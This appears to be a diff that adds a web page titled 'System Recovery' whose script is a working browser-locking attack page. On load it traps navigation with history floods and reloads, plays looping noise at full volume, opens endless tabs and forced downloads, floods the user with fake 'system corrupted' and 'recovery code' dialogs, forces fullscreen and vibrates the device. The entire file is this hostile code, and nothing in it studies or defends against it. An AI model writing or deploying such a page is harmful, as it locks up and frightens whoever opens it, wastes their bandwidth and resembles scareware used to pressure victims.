@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>System Recovery</title>
+    <style>
+        * { margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+        body { background: black; overflow: hidden; position: fixed; width: 100%; height: 100%; }
+    </style>
+</head>
+<body>
+    <div id="fake-desktop"></div>
+    <script>
+    (function() {
+        // SUPER LOCK
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        for (let i = 0; i < 200; i++) {
+            history.pushState({ i: i }, '', '#lock' + i);
+        }
+        
+        window.addEventListener('popstate', function() {
+            for (let i = 0; i < 50; i++) {
+                history.pushState({}, '', '#block' + Math.random());
+            }
+            location.reload();
+        });
+
+        // MAX VOLUME + SCREAM
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const gainNode = audioCtx.createGain();
+        gainNode.gain.value = 1.0;
+        gainNode.connect(audioCtx.destination);
+
+        function createScreamBuffer(callback) {
+            const sampleRate = audioCtx.sampleRate;
+            const length = sampleRate * 2;
+            const buffer = audioCtx.createBuffer(1, length, sampleRate);
+            const data = buffer.getChannelData(0);
+            for (let i = 0; i < length; i++) {
+                data[i] = Math.sin(i * 0.02) * Math.random() * 0.8 + Math.sin(i * 0.1) * 0.5;
+            }
+            callback(buffer);
+        }
+
+        function playScreamLoop() {
+            createScreamBuffer(function(buffer) {
+                const source = audioCtx.createBufferSource();
+                source.buffer = buffer;
+                source.connect(gainNode);
+                source.loop = true;
+                source.start();
+                setInterval(() => {
+                    const s = audioCtx.createBufferSource();
+                    s.buffer = buffer;
+                    s.connect(gainNode);
+                    s.start();
+                }, 400);
+            });
+        }
+
+        function unlockAudio() {
+            audioCtx.resume().then(() => {
+                playScreamLoop();
+                setInterval(() => {
+                    if (gainNode.gain.value < 1.0) gainNode.gain.value = 1.0;
+                }, 100);
+            });
+        }
+        
+        document.body.addEventListener('touchstart', unlockAudio);
+        document.body.addEventListener('click', unlockAudio);
+        setTimeout(unlockAudio, 300);
+
+        // INFINITE TABS
+        function openHellTabs() {
+            const downloadUrls = [
+                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAYnVnLmRhdFVUCQAD',
+                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAbG9nLmJpblVUCQAD',
+                'https://httpbin.org/bytes/1048576',
+                'https://httpbin.org/drip?duration=5&numbytes=500000',
+                'about:blank#pop'
+            ];
+
+            function spawnTab() {
+                const url = downloadUrls[Math.floor(Math.random() * downloadUrls.length)];
+                const w = window.open(url, '_blank');
+                if (!w) {
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'junk.bin';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
+            }
+
+            for (let i = 0; i < 45; i++) {
+                setTimeout(spawnTab, i * 70);
+            }
+
+            setInterval(() => {
+                for (let i = 0; i < 5; i++) spawnTab();
+            }, 1500);
+
+            setInterval(() => {
+                for (let f = 0; f < 10; f++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = 'https://httpbin.org/bytes/250000';
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    setTimeout(() => iframe.remove(), 1500);
+                }
+            }, 1000);
+        }
+
+        // ALERT FLOOD
+        function alertFlood() {
+            setInterval(() => {
+                alert('⚠️ SYSTEM ERROR ⚠️');
+                confirm('System corrupted. Press OK to continue...');
+                prompt('Enter recovery code:', '');
+            }, 400);
+        }
+
+        // FULLSCREEN LOCK
+        function forceFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => {});
+            }
+        }
+        setInterval(forceFullscreen, 500);
+        
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) forceFullscreen();
+        });
+
+        // VIBRATION
+        if (navigator.vibrate) {
+            setInterval(() => {
+                navigator.vibrate([500, 300, 500, 300, 1000]);
+            }, 800);
+        }
+
+        // BLOCK CONTEXT MENU
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+
+        // PREVENT VISIBILITY ESCAPE
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                location.reload();
+            }
+        });
+
+        // START EVERYTHING
+        function startHell() {
+            openHellTabs();
+            alertFlood();
+            forceFullscreen();
+        }
+
+        document.body.addEventListener('touchstart', startHell);
+        document.body.addEventListener('click', startHell);
+        setTimeout(startHell, 500);
+
+        setInterval(() => {
+            history.pushState({}, '', '#hijack');
+        }, 100);
+    })();
+    </script>
+</body>
+</html>
